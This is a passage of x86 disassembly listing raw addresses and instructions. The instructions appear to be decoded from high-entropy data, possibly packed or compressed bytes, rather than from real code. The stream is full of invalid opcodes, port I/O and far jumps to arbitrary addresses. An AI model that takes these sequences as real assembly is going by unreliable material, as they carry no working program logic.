  41832e:	outs   dx,BYTE PTR ds:[esi]
  41832f:	es mov ebx,0x129d7016
  418335:	outs   dx,DWORD PTR ds:[esi]
  418336:	lea    ebp,[eax-0x2]
  418339:	jecxz  0x41836d
  41833b:	xor    al,0x16
  41833d:	pop    eax
  41833e:	popf   
  41833f:	pop    esi
  418340:	je     0x418310
  418342:	clc    
  418343:	and    eax,0x1e89afc6
  418348:	call   0xe80c:0x81c4b8e1
  41834f:	push   cs
  418350:	push   es
  418351:	xor    ebp,DWORD PTR [eax-0x76]
  418354:	xor    dl,ch
  418356:	pop    es
  418357:	scas   eax,DWORD PTR es:[edi]
  418358:	aas    
  418359:	sbb    DWORD PTR [eax+esi*2-0x668751ec],edx
  418360:	adc    DWORD PTR [eax+0x18],eax
  418363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418364:	jb     0x41833b
  418366:	jno    0x41830c
  418368:	or     BYTE PTR [ecx],cl
  41836a:	mov    dl,0xf9
  41836c:	sub    edx,edx
  41836e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41836f:	dec    edi
  418370:	pop    ss
  418371:	mov    cl,0x34
  418373:	pop    eax
  418374:	loopne 0x4183c6
  418376:	pusha  
  418377:	inc    ecx
  418378:	out    dx,eax
  418379:	dec    esi
  41837a:	jge    0x4183c4
  41837c:	stc    
  41837d:	stc    
  41837e:	jae    0x41838f
  418380:	gs jmp 0xe29cc201
  418386:	or     edi,DWORD PTR [esi-0x5f08ec4a]
  41838c:	je     0x418381
  41838e:	xchg   esi,eax
  41838f:	lahf   
  418390:	in     al,0x0
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	mov    edx,0xc2a15484
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR ds:0xf9000001,al
  41840d:	outs   dx,DWORD PTR ds:[esi]
  41840e:	(bad)  
  41840f:	cmc    
  418410:	mov    ds,ebp
  418412:	int    0x5b
  418414:	ds pushf 
  418416:	pop    ebx
  418417:	int    0xad
  418419:	lea    ebx,[eax]
  41841b:	leave  
  41841c:	test   al,0x7c
  41841e:	pop    es
  41841f:	inc    esp
  418420:	push   ecx
  418421:	les    esi,FWORD PTR [ecx+0x47801f9]
  418427:	hlt    
  418428:	pop    edx
  418429:	cmp    eax,0x5ac3447f
  41842e:	cmp    eax,0xeb5bdbdf
  418433:	popa   
  418434:	pop    ss
  418435:	sbb    esp,0xffffff8c
  418438:	stos   BYTE PTR es:[edi],al
  418439:	aad    0x88
  41843b:	inc    ebp
  41843c:	cmc    
  41843d:	and    ebp,edx
  41843f:	mov    eax,0x4e0f82ff
  418444:	dec    ebx
  418445:	hlt    
  418446:	xchg   esi,eax
  418447:	aas    
  418448:	out    dx,al
  418449:	mov    dh,0x27
  41844b:	mov    BYTE PTR [eax-0x57],ch
  41844e:	jbe    0x418456
  418450:	push   edx
  418451:	cmp    eax,0x2bf63bd6
  418456:	sahf   
  418457:	outs   dx,DWORD PTR ds:[esi]
  418458:	pushf  
  418459:	xchg   esp,eax
  41845a:	lock (bad) 
  41845c:	adc    DWORD PTR [ebx],eax
  41845e:	out    0xc1,al
  418460:	cmc    
  418461:	sahf   
  418462:	add    edx,0xf6aff32e
  418468:	cmp    eax,0x715cbc77
  41846d:	push   cs
  41846e:	mov    ch,0x82
  418470:	pop    DWORD PTR [ebx]
  418472:	xor    esi,DWORD PTR [ebx-0x4f]
  418475:	jge    0x4184db
  418477:	and    ch,BYTE PTR [ebx]
  418479:	sub    eax,0x39ba15ec
  41847e:	std    
  41847f:	adc    DWORD PTR [edi],edx
  418481:	sbb    eax,0xf623aede
  418486:	gs (bad) 
  418488:	sahf   
  418489:	mov    ds:0x4df486b8,eax
  41848e:	pop    esi
  41848f:	push   ebp
  418490:	nop
  418491:	sbb    edx,DWORD PTR [ebp-0x26f47be3]
  418497:	xor    BYTE PTR [ebx],al
  418499:	hlt    
  41849a:	pop    ss
  41849b:	xchg   ebx,eax
  41849c:	dec    ebx
  41849d:	push   ebp
  41849e:	mov    ebx,0xeba4451d
  4184a3:	(bad)  
  4184a5:	imul   edi,DWORD PTR gs:[edi],0x73
  4184a9:	repnz xchg esi,eax
  4184ab:	test   cl,ah
  4184ad:	pop    ecx
  4184ae:	sbb    eax,0x4b5cac24
  4184b3:	mov    WORD PTR [ebx],?
  4184b5:	mov    ds:0x441cea79,al
  4184ba:	stc    
  4184bb:	xor    ah,bl
  4184bd:	arpl   WORD PTR [ebx+0x112fda79],di
  4184c3:	pop    es
  4184c4:	xchg   DWORD PTR [eax],eax
  4184c6:	clc    
  4184c7:	mov    dl,BYTE PTR [edx]
  4184c9:	xor    esi,DWORD PTR [esi+0x3e264e96]
  4184cf:	xchg   esp,eax
  4184d0:	ror    DWORD PTR [esi],1
  4184d2:	or     ch,bl
  4184d4:	dec    edx
  4184d5:	mov    esi,DWORD PTR [eiz*8+0x53261d6]
  4184dc:	lods   al,BYTE PTR ds:[esi]
  4184dd:	lock jno 0x418499
  4184e0:	mov    edx,ebx
  4184e2:	daa    
  4184e3:	mov    eax,ds:0xf1780b35
  4184e8:	xchg   edi,eax
  4184e9:	loope  0x418485
  4184eb:	cli    
  4184ec:	mov    eax,ds:0xa69e0cc2
  4184f1:	sbb    al,0x79
  4184f3:	xchg   esp,eax
  4184f4:	sbb    al,0x14
  4184f6:	inc    ebp
  4184f7:	fisub  DWORD PTR [edx]
  4184f9:	imul   esp,eax,0x27
  4184fc:	mov    eax,ds:0x77657dea
  418501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418502:	mov    ebp,0xddec9d6e
  418507:	retf   
  418508:	sub    edx,DWORD PTR [ecx+0x25d4fbc9]
  41850e:	retf   
  41850f:	mov    ds:0x15,al
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	mov    esp,0xc7d42dd8
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR ds:0xf2000001,al
  41858d:	pop    edx
  41858e:	cmp    al,0x78
  418590:	loopne 0x4185cc
  418592:	pop    edx
  418593:	jmp    0x128738ff
  418598:	sbb    BYTE PTR [ebp+0x28],ah
  41859b:	mov    eax,0xf4f0e8b1
  4185a0:	in     eax,dx
  4185a1:	js     0x41857e
  4185a3:	mov    dl,0x70
  4185a5:	sbb    al,0x62
  4185a7:	mov    ch,0x9a
  4185a9:	xor    eax,DWORD PTR [ebx-0x45]
  4185ac:	xchg   esi,eax
  4185ad:	push   0x8b2dd042
  4185b2:	push   esi
  4185b3:	mov    al,0x38
  4185b5:	xor    DWORD PTR ds:0x764abef7,esp
  4185bb:	dec    esp
  4185bc:	and    eax,0xa196395f
  4185c1:	mov    al,0x26
  4185c3:	xchg   ebx,esp
  4185c5:	dec    edi
  4185c6:	pop    eax
  4185c7:	stos   BYTE PTR es:[edi],al
  4185c8:	jo     0x4185c0
  4185ca:	sar    BYTE PTR [edx+0xc],cl
  4185cd:	inc    ebx
  4185ce:	out    0xc7,al
  4185d0:	lahf   
  4185d1:	test   al,0x5a
  4185d3:	jnp    0x41855b
  4185d5:	mov    ecx,0xef0de38f
  4185da:	retf   
  4185db:	int3   
  4185dc:	mov    al,ds:0xfd62de0b
  4185e1:	jg     0x4185a4
  4185e3:	cmp    al,0x35
  4185e5:	(bad)  
  4185e7:	enter  0xd7bb,0xf2
  4185eb:	xor    eax,0xf751f4ff
  4185f0:	cli    
  4185f1:	lods   eax,DWORD PTR ds:[esi]
  4185f2:	in     al,dx
  4185f3:	xor    DWORD PTR [esi-0x54],0xffffffe4
  4185f7:	mov    esp,DWORD PTR [edx-0x5b]
  4185fa:	adc    bl,dh
  4185fc:	mov    dh,0x0
  4185fe:	fwait
  4185ff:	cmp    al,0x69
  418601:	out    dx,eax
  418602:	inc    esp
  418603:	ficom  WORD PTR [eax-0x4187fe1a]
  418609:	pop    ds
  41860a:	mov    ah,0xce
  41860c:	ret    0xc5f7
  41860f:	jbe    0x418613
  418611:	jecxz  0x418617
  418613:	pusha  
  418614:	ins    BYTE PTR es:[edi],dx
  418615:	cmp    DWORD PTR ss:[ebx+ebx*4+0x32735df4],ecx
  41861d:	xchg   ecx,eax
  41861e:	fstp   st(0)
  418620:	ins    DWORD PTR es:[edi],dx
  418621:	mov    cl,0x3b
  418623:	cmp    al,0x73
  418625:	iret   
  418626:	cld    
  418627:	out    0x8c,eax
  418629:	(bad)  
  41862a:	ficom  DWORD PTR [ecx+0x4b]
  41862d:	jbe    0x4185e8
  41862f:	dec    edx
  418630:	repz push edx
  418632:	sbb    eax,0x8d6a827c
  418637:	push   0xffffffb5
  418639:	jae    0x4186ba
  41863b:	mov    BYTE PTR [esi],cl
  41863d:	cli    
  41863e:	push   ss
  41863f:	test   BYTE PTR [ecx],0x30
  418642:	cmp    ah,BYTE PTR [edi]
  418644:	mov    esi,0xe8d859f5
  418649:	data16 xchg cx,ax
  41864c:	ds or  al,0x6e
  41864f:	loope  0x418663
  418651:	(bad)  
  418652:	mov    eax,ds:0xf50edf86
  418657:	(bad)  
  418658:	cmc    
  418659:	push   esp
  41865a:	mov    ebx,0xdb791a3d
  41865f:	repnz mov bh,0xe2
  418662:	or     ebx,0xffffff93
  418665:	aad    0xde
  418667:	push   ebp
  418668:	ds push ds
  41866a:	mov    ah,0xf
  41866c:	mov    bl,0x6a
  41866e:	js     0x4186e5
  418670:	cmp    al,0xca
  418672:	sub    DWORD PTR [ebp+edx*2+0x54],esp
  418676:	imul   eax,DWORD PTR [esi-0x622996ea],0xffffffca
  41867d:	xlat   BYTE PTR ds:[ebx]
  41867e:	jae    0x418602
  418680:	lods   eax,DWORD PTR ds:[esi]
  418681:	or     BYTE PTR [ebp+0x68],bh
  418684:	or     DWORD PTR ds:0xdd528656,esp
  41868a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41868b:	mov    eax,ds:0x65596b62
  418690:	pop    esi
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	gs cli 
  418702:	jb     0x418724
  418704:	int3   
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0xfb000001,al
  41870d:	je     0x4186b0
  41870f:	mov    esi,0xf3ba1aa1
  418714:	xchg   edx,eax
  418715:	push   es
  418716:	mov    gs:0xf69b5c6c,al
  41871c:	push   0xbcf39791
  418721:	js     0x418716
  418723:	out    dx,al
  418724:	add    ebx,ebp
  418726:	and    edx,DWORD PTR [ecx-0x32e68edd]
  41872c:	popa   
  41872d:	jns    0x418723
  41872f:	enter  0xbd8c,0xa9
  418733:	test   al,0x75
  418735:	les    edx,FWORD PTR [ecx-0x775a16c6]
  41873b:	out    0x9e,eax
  41873d:	pop    ss
  41873e:	adc    eax,ebp
  418740:	(bad)  
  418741:	dec    esi
  418742:	jne    0x4187c1
  418744:	sub    DWORD PTR [ecx],esp
  418746:	shl    DWORD PTR [esp+eax*8],cl
  418749:	jge    0x418727
  41874b:	sbb    bh,al
  41874d:	cmp    al,BYTE PTR [ebx+0x7ee5dc81]
  418753:	mov    bl,ch
  418755:	ror    BYTE PTR [edi+0x1b4f01b5],cl
  41875b:	and    eax,0x42f3897e
  418760:	or     ebx,edx
  418762:	daa    
  418763:	cdq    
  418764:	add    ah,BYTE PTR [esi-0x3906c066]
  41876a:	addr16 mov bh,0x94
  41876d:	inc    ebp
  41876e:	int3   
  41876f:	jmp    0x7dc8:0xdfffefb2
  418776:	push   eax
  418777:	mov    ds:0x3bca8f12,eax
  41877c:	and    BYTE PTR [ecx+0x14e5f66c],dh
  418782:	adc    eax,0x9d8ded99
  418787:	or     DWORD PTR [edx],edx
  418789:	popf   
  41878a:	jmp    0x41880a
  41878c:	inc    esp
  41878d:	adc    DWORD PTR [edi],esi
  41878f:	aaa    
  418790:	cmp    esi,edx
  418792:	pusha  
  418793:	push   ss
  418794:	shl    esi,cl
  418796:	cld    
  418797:	adc    eax,0x77f6391
  41879c:	lock jb 0x4187ad
  41879f:	jae    0x41873e
  4187a1:	jmp    0x167f:0x41af4a45
  4187a8:	or     ebp,DWORD PTR [ebx+0x9]
  4187ab:	xor    eax,0xdd747e28
  4187b0:	cmp    edi,ecx
  4187b2:	dec    edi
  4187b3:	sub    BYTE PTR [ebp-0x54],bh
  4187b6:	out    0x79,eax
  4187b8:	and    eax,0x7e648fb0
  4187bd:	(bad)  
  4187be:	push   ds
  4187bf:	or     eax,0xc5b868fd
  4187c4:	ds pop ecx
  4187c6:	retf   0xdb5c
  4187c9:	cdq    
  4187ca:	in     eax,dx
  4187cb:	lahf   
  4187cc:	mov    ss,WORD PTR [edi+0x12]
  4187cf:	ret    0xd10a
  4187d2:	cmc    
  4187d3:	pop    ebp
  4187d4:	out    dx,eax
  4187d5:	(bad)
  4187da:	add    al,0xc3
  4187dc:	push   ebp
  4187dd:	jmp    0x8b7f:0xae6dbea5
  4187e4:	fdivr  st,st(7)
  4187e6:	retf   0x3fef
  4187e9:	xchg   ah,ch
  4187eb:	xchg   ebp,eax
  4187ec:	mov    dl,0x34
  4187ee:	xor    ch,dl
  4187f0:	das    
  4187f1:	adc    BYTE PTR [ebp-0x763c32ad],bl
  4187f7:	push   ecx
  4187f8:	mov    edx,0xbf85a522
  4187fd:	push   ebx
  4187fe:	inc    edi
  4187ff:	pop    es
  418800:	sti    
  418801:	pop    ecx
  418802:	mov    eax,ds:0x20c37865
  418807:	fdivr  st,st(1)
  418809:	cli    
  41880a:	add    edi,DWORD PTR [ebx-0x61]
  41880d:	in     al,0x3c
  41880f:	test   al,0xac
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi+0x6e9c3acd]
  418881:	add    esi,DWORD PTR [edx-0x21]
  418884:	rol    DWORD PTR [ebx],1
  418886:	add    DWORD PTR [eax],eax
  418888:	add    eax,0x1000001
  41888d:	sbb    edi,eax
  41888f:	(bad)  [esi+0x4938af4e]
  418895:	aas    
  418896:	ins    DWORD PTR es:[edi],dx
  418897:	dec    edi
  418898:	outs   dx,BYTE PTR ds:[esi]
  418899:	sub    DWORD PTR [ecx],ebx
  41889b:	hlt    
  41889c:	pop    ecx
  41889d:	pusha  
  41889e:	aam    0xfb
  4188a0:	push   esi
  4188a1:	add    eax,0x2226c733
  4188a6:	jns    0x418926
  4188a8:	outs   dx,DWORD PTR ds:[esi]
  4188a9:	fimul  WORD PTR [ebp-0xc4c131d]
  4188af:	push   ecx
  4188b0:	mov    WORD PTR [eax],ds
  4188b2:	ret    
  4188b3:	sbb    bh,BYTE PTR [ebx-0x1794c240]
  4188b9:	call   0xfd3:0x97e380ba
  4188c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188c1:	test   al,0x2
  4188c3:	aad    0xf8
  4188c5:	or     DWORD PTR [edx],edx
  4188c7:	in     eax,0x4b
  4188c9:	xor    eax,0x12fc3ab6
  4188ce:	aas    
  4188cf:	ja     0x41889d
  4188d1:	dec    BYTE PTR [edi]
  4188d3:	adc    al,0x3b
  4188d5:	dec    esi
  4188d6:	jle    0x41891c
  4188d8:	jp     0x418903
  4188da:	into   
  4188db:	scas   eax,DWORD PTR es:[edi]
  4188dc:	std    
  4188dd:	push   esp
  4188de:	clc    
  4188df:	repz cmp al,ch
  4188e2:	jbe    0x4188a6
  4188e4:	sbb    DWORD PTR [esi+0x15],ecx
  4188e7:	mov    cs,WORD PTR [eax]
  4188e9:	in     eax,dx
  4188ea:	sub    al,BYTE PTR [edx-0x71]
  4188ed:	fsubr  DWORD PTR [ebp+0x5b]
  4188f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188f1:	dec    edx
  4188f2:	inc    ebx
  4188f3:	(bad)  
  4188f4:	in     eax,dx
  4188f5:	mov    al,0x1a
  4188f7:	inc    ebx
  4188f8:	out    dx,al
  4188f9:	jle    0x41889d
  4188fb:	lock or dh,dh
  4188fe:	inc    DWORD PTR ds:0xaedbf481
  418904:	sub    edx,DWORD PTR [edi]
  418906:	mov    al,BYTE PTR [edx+0x50abb87c]
  41890c:	mov    ds:0x887df3dc,eax
  418911:	rcr    edi,0x9d
  418914:	sahf   
  418915:	mov    edx,0xad4058fb
  41891a:	xor    DWORD PTR [edx-0x56],0xfffffff8
  41891e:	nop
  41891f:	adc    DWORD PTR [eax+0x5785214b],esp
  418925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418926:	xlat   BYTE PTR ds:[ebx]
  418927:	mov    dl,0x9d
  418929:	dec    esi
  41892a:	pop    esp
  41892b:	push   cs
  41892c:	inc    ebx
  41892d:	jo     0x418969
  41892f:	popf   
  418930:	mov    ah,0xf2
  418932:	cmc    
  418933:	push   0x5e
  418935:	mov    esi,0x3835df78
  41893a:	mov    al,0x28
  41893c:	rcl    bl,1
  41893e:	fdiv   DWORD PTR [edi]
  418940:	cs pop edx
  418942:	push   cs
  418943:	pop    edi
  418944:	xlat   BYTE PTR ds:[ebx]
  418945:	fistp  QWORD PTR [ebx]
  418947:	aad    0x27
  418949:	mul    DWORD PTR [eax+0x28]
  41894c:	push   esp
  41894d:	pushf  
  41894e:	jge    0x418906
  418950:	fadd   DWORD PTR [ecx-0x2ed50fb5]
  418956:	add    DWORD PTR [edx+0x18],esi
  418959:	jmp    0x2dd3aa8c
  41895e:	rcl    BYTE PTR [esi],cl
  418960:	add    edx,esp
  418962:	into   
  418963:	out    dx,al
  418964:	jp     0x4189af
  418966:	pop    edi
  418967:	jmp    0xa7bc422a
  41896c:	pop    ds
  41896d:	pop    ss
  41896e:	mov    ch,0x24
  418970:	pop    ss
  418971:	fdiv   st,st(0)
  418973:	and    DWORD PTR ds:[ecx-0x6e14a1b6],esi
  41897a:	xchg   ebp,eax
  41897b:	test   DWORD PTR [ebp+edx*2+0x7e4545ea],0x17cc68ba
  418986:	push   ecx
  418987:	pop    ebp
  418988:	sbb    ah,BYTE PTR [eax-0x55d50c86]
  41898e:	shl    DWORD PTR [ecx+0xc6],1
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x81dd7e69
  418a03:	daa    
  418a04:	(bad)  
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0x54000001,al
  418a0d:	mov    ch,0xde
  418a0f:	stos   DWORD PTR es:[edi],eax
  418a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a11:	adc    bh,BYTE PTR [edx-0x5a]
  418a14:	mul    BYTE PTR [edx+edx*4+0x65]
  418a18:	rcr    ah,cl
  418a1a:	ficomp WORD PTR [edx]
  418a1c:	loope  0x418a72
  418a1e:	xchg   DWORD PTR [esi+0x35b5e6ea],esp
  418a24:	push   ds
  418a25:	js     0x418a94
  418a27:	and    eax,0x826fff09
  418a2c:	jb     0x418a44
  418a2e:	inc    eax
  418a2f:	mov    al,ds:0x2656fba3
  418a34:	enter  0x2e5e,0x9d
  418a38:	das    
  418a39:	sub    BYTE PTR [edx+0x4b],dh
  418a3c:	jp     0x418a08
  418a3e:	outs   dx,DWORD PTR ds:[esi]
  418a3f:	xchg   esi,eax
  418a40:	call   0x3f3e:0xbd9a709d
  418a47:	mov    al,0x21
  418a49:	cmp    eax,0x828f0cb0
  418a4e:	repz cmp eax,0xb04bb1a7
  418a54:	mov    WORD PTR [edi-0x10],?
  418a57:	or     bh,BYTE PTR [ebp-0xe]
  418a5a:	mov    esp,0xd45c3515
  418a5f:	mov    eax,0xf646fa0c
  418a64:	adc    eax,0xae031e9a
  418a69:	pop    ebp
  418a6a:	cmp    eax,0xda2eaed2
  418a6f:	adc    BYTE PTR [edx+edx*2-0x7f],dh
  418a73:	add    eax,0x2e03f1d0
  418a78:	add    al,0xd7
  418a7a:	pop    esi
  418a7b:	xor    eax,0x5642e783
  418a80:	xor    BYTE PTR [ebp+0x68],dl
  418a83:	in     eax,0x5e
  418a85:	cmp    DWORD PTR [edx+edi*2+0x76],0x70b0e99a
  418a8d:	jge    0x418a7e
  418a8f:	pop    ecx
  418a90:	jo     0x418a27
  418a92:	mov    bl,0x7f
  418a94:	lea    ecx,[ebp-0x78075785]
  418a9a:	stc    
  418a9b:	xor    bh,BYTE PTR [ebp+0x6]
  418a9e:	add    ah,0x77
  418aa1:	xchg   edi,eax
  418aa2:	(bad)  
  418aa3:	jns    0x418ad6
  418aa5:	fdiv   st,st(1)
  418aa7:	std    
  418aa8:	xor    al,0x6c
  418aaa:	bound  ebp,QWORD PTR [eax+ebp*4]
  418aad:	fild   QWORD PTR [eax]
  418aaf:	or     DWORD PTR [edi-0x36c4fc72],esi
  418ab5:	(bad)  
  418ab6:	daa    
  418ab7:	adc    BYTE PTR [ecx-0x4c9bac58],cl
  418abd:	stos   BYTE PTR es:[edi],al
  418abe:	xchg   esi,eax
  418abf:	jge    0x418b23
  418ac1:	outs   dx,BYTE PTR ds:[esi]
  418ac2:	or     eax,0xd8ec241c
  418ac7:	push   ds
  418ac8:	xor    ah,BYTE PTR [eax]
  418aca:	pop    ecx
  418acb:	xchg   ebp,eax
  418acc:	dec    edx
  418acd:	sbb    bl,BYTE PTR [eax]
  418acf:	add    DWORD PTR [edi-0x36],edx
  418ad2:	xor    DWORD PTR [edi],esp
  418ad4:	dec    ecx
  418ad5:	scas   al,BYTE PTR es:[edi]
  418ad6:	inc    esi
  418ad7:	in     al,dx
  418ad8:	mov    ebx,DWORD PTR [edx]
  418ada:	xchg   edx,eax
  418adb:	add    eax,0x81b23246
  418ae0:	adc    eax,0x9b7354bf
  418ae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ae6:	mov    ?,WORD PTR [ecx+0x33056b39]
  418aec:	and    bh,BYTE PTR [edx-0x7dc884fa]
  418af2:	lea    edi,[edx-0x69904468]
  418af8:	sbb    bh,BYTE PTR [esi-0x3cbcba20]
  418afe:	adc    cl,BYTE PTR [edx-0x67]
  418b01:	or     al,0x2a
  418b03:	fisub  DWORD PTR ds:0x8a61e379
  418b09:	mov    ch,0xa8
  418b0b:	mov    cl,dh
  418b0d:	mov    bl,0x82
  418b0f:	and    BYTE PTR [edx+0x0],al
	...
  418b72:	add    BYTE PTR [eax],al
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xb
  418b81:	ss cmp eax,0x105dbb0
  418b87:	add    BYTE PTR ds:0x8c000001,al
  418b8d:	outs   dx,DWORD PTR ds:[esi]
  418b8e:	fist   DWORD PTR [edx+0x2]
  418b91:	and    BYTE PTR [esi+0x234d97f6],0x8f
  418b98:	sbb    DWORD PTR [eax-0x6280ee20],ecx
  418b9e:	mov    bl,0xfb
  418ba0:	xor    ah,dh
  418ba2:	mov    ebx,0x516838bc
  418ba7:	repnz add DWORD PTR [ebx],edx
  418baa:	or     eax,0x798de378
  418baf:	mov    dl,0x3c
  418bb1:	inc    ecx
  418bb2:	into   
  418bb3:	push   esi
  418bb4:	mov    WORD PTR [edi+0x7c],?
  418bb7:	push   eax
  418bb8:	xchg   ecx,eax
  418bb9:	lods   al,BYTE PTR ds:[esi]
  418bba:	push   ds
  418bbb:	cwde   
  418bbc:	lds    ebx,FWORD PTR [ebx+eiz*4]
  418bbf:	inc    ebx
  418bc0:	jno    0x418c2f
  418bc2:	xchg   DWORD PTR [ecx+0x6fc7c775],edi
  418bc8:	out    0x7a,al
  418bca:	push   esp
  418bcb:	pop    ecx
  418bcc:	retf   
  418bcd:	ins    DWORD PTR es:[edi],dx
  418bce:	jnp    0x418b63
  418bd0:	pop    ebp
  418bd1:	mov    cl,0x7f
  418bd3:	mov    cl,0x8f
  418bd5:	retf   
  418bd6:	adc    BYTE PTR [ebx],ch
  418bd8:	clc    
  418bd9:	adc    edx,eax
  418bdb:	mov    ds:0xe576f9ed,eax
  418be0:	in     al,dx
  418be1:	std    
  418be2:	lds    edx,FWORD PTR [esi-0x74]
  418be5:	sub    BYTE PTR [ecx+0x292e1e58],cl
  418beb:	xchg   ebx,eax
  418bec:	fisttp DWORD PTR ss:[edi+edi*2-0x132d868f]
  418bf4:	stos   DWORD PTR es:[edi],eax
  418bf5:	scas   eax,DWORD PTR es:[edi]
  418bf6:	cmp    al,0xb9
  418bf8:	adc    DWORD PTR [eax+0x15],esp
  418bfb:	repz dec edx
  418bfd:	jle    0x418bec
  418bff:	mov    al,ds:0xc290ccd7
  418c04:	xchg   ecx,eax
  418c05:	push   edi
  418c06:	mov    esp,0x61e124ee
  418c0b:	xchg   ecx,eax
  418c0c:	and    BYTE PTR [esi+eax*1],al
  418c0f:	fimul  DWORD PTR [ebp+0x79]
  418c12:	xlat   BYTE PTR ds:[ebx]
  418c13:	fimul  WORD PTR [eax+0x20b841f6]
  418c19:	inc    eax
  418c1a:	cdq    
  418c1b:	in     al,0x38
  418c1d:	cmp    dl,BYTE PTR [edi]
  418c1f:	inc    edi
  418c20:	inc    esp
  418c21:	es xchg bh,ah
  418c24:	inc    edx
  418c25:	lahf   
  418c26:	pop    esi
  418c27:	mov    eax,0x27b84f32
  418c2c:	mov    BYTE PTR [ebx],0x70
  418c2f:	inc    ebp
  418c30:	aam    0x7f
  418c32:	outs   dx,BYTE PTR ds:[esi]
  418c33:	jl     0x418bc4
  418c35:	jp     0x418bca
  418c37:	fnstcw WORD PTR [edi-0x592cd980]
  418c3d:	dec    eax
  418c3e:	mov    ah,0x2b
  418c40:	retf   0xef17
  418c43:	cwde   
  418c44:	add    al,0xbc
  418c46:	add    cl,BYTE PTR [esi-0x13]
  418c49:	test   eax,0x897a786b
  418c4f:	jl     0x418c56
  418c51:	mov    es,WORD PTR [ebp+0x1d3f78ec]
  418c57:	cmp    ecx,esi
  418c59:	sbb    esi,eax
  418c5b:	setbe  BYTE PTR [ebp+0x6]
  418c5f:	mov    DWORD PTR [ebx+0x3331f3ed],esp
  418c65:	jg     0x418c73
  418c67:	aaa    
  418c68:	shr    bl,0xf1
  418c6b:	lods   eax,DWORD PTR ds:[esi]
  418c6c:	shl    eax,cl
  418c6e:	dec    esi
  418c6f:	cwde   
  418c70:	xor    BYTE PTR [eax-0xa],ch
  418c73:	xchg   ecx,eax
  418c74:	js     0x418c8d
  418c76:	push   edx
  418c77:	mov    edi,0x9fb57200
  418c7c:	sub    esp,DWORD PTR [eax-0x58]
  418c7f:	cmp    ch,BYTE PTR [ebx+0x6d]
  418c82:	xchg   ebp,eax
  418c83:	fistp  WORD PTR ds:0xc6ea8c6f
  418c89:	adc    ecx,ecx
  418c8b:	cs scas eax,DWORD PTR es:[edi]
  418c8d:	addr16 loopne 0x418caf
  418c90:	scas   al,BYTE PTR es:[edi]
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	rcl    dl,cl
  418d01:	aaa    
  418d02:	dec    ecx
  418d03:	pop    edx
  418d04:	loopne 0x418d0c
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0xe0000001
  418d0d:	rol    bh,1
  418d0f:	fisttp QWORD PTR [edi-0x25]
  418d12:	retf   0x9a7a
  418d15:	add    al,0x3e
  418d17:	ja     0x418d4a
  418d19:	pop    ecx
  418d1a:	dec    ebp
  418d1b:	adc    al,0xf7
  418d1d:	mov    dl,0x5b
  418d1f:	aam    0x4
  418d21:	xor    bh,bh
  418d23:	adc    BYTE PTR [eax+0x30041da2],bl
  418d29:	fdiv   st,st(3)
  418d2b:	cmp    ebx,DWORD PTR [ebx]
  418d2d:	dec    esi
  418d2e:	ja     0x418d6b
  418d30:	dec    eax
  418d31:	and    bl,ch
  418d33:	lahf   
  418d34:	push   ebp
  418d35:	or     al,BYTE PTR [edi]
  418d37:	push   0xb13298c5
  418d3c:	push   esp
  418d3d:	mov    edi,0xb8b2d1fe
  418d42:	lock imul eax,edx,0x91fce384
  418d49:	sub    esp,DWORD PTR [ebx-0x6f]
  418d4c:	inc    BYTE PTR [eax+0x1c2a0b5e]
  418d52:	test   eax,0xeb9319ba
  418d57:	retf   0xd8fa
  418d5a:	fcom   DWORD PTR [edi+0x56]
  418d5d:	mov    al,ds:0x7a762117
  418d62:	fs ss jns 0x418dbc
  418d66:	cmc    
  418d67:	cmp    eax,0x3aa23b68
  418d6c:	xor    eax,0xd82daec
  418d71:	bound  ebx,QWORD PTR [esi-0x7f56e855]
  418d77:	dec    edx
  418d78:	push   0xffffff92
  418d7a:	adc    eax,0x498605d2
  418d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d80:	outs   dx,DWORD PTR ds:[esi]
  418d81:	mov    ch,0xe4
  418d83:	xchg   esi,eax
  418d84:	pop    DWORD PTR [edx-0x5bfceb6e]
  418d8a:	xchg   ecx,eax
  418d8b:	xchg   esp,eax
  418d8c:	jne    0x418d3c
  418d8e:	and    al,0x14
  418d90:	les    esi,FWORD PTR [ebx+0x19d87885]
  418d96:	jmp    0xba71:0xd43f0d4
  418d9d:	fwait
  418d9e:	in     al,dx
  418d9f:	aas    
